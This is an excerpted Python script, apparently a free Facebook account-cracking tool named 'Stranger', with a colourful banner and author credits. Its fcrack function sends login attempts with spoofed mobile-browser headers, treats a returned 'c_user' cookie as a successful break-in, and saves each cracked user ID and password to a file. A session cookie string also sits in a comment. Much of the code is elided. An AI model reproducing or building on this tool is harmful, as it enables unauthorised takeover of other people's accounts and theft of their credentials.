""" OPEN SOURCE WITH DEMON-404 """
""" SOURCE FROM AHMED FARHAN """
""" FOLLOW MY GITHUB FOR MORE SOURCE """
""" GITHUB URL : https://github.com/AHMED-143 """
""" TAKE LOVE USE AND GIVE FEEDBACK """
#coding=utf
import uuid
...
--------------------------------------------------
(+) AUTHOR     : \033[1;32mStranger \033[1;37m
(+) GITHUB     : \033[1;32mNOT FOUND\033[1;37m
(+) TOOL NAME  : \033[1;32mStranger\033[1;37m
(+) TOOL TYPE  : \033[1;32mRANDOM\033[1;37m
(+) STATUS     : \033[1;32mFREE\033[1;37m
--------------------------------------------------
(+) \033[1;37mVERSION    :\033[1;32m0.1\033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
--------------------------------------------------"""
def lines():
	print('\33[1;37m--------------------------------------------------')
loop = 0
...
def fcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=0oAPZh1BGETBx0zGau2wHNfr; sb=0oAPZv0yq7q3izAPQhvBfcvs; m_pixel_ratio=3; ps_l=0; ps_n=0; wd=360x680; fr=0LTGTfcty1LB0wZhP..BmD4DS..AAA.0.0.BmD4Df.AWV6rWORdwQ',
    'dpr': '3',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Infinix X695"',
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                open('Stranger-OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(cid)
                break
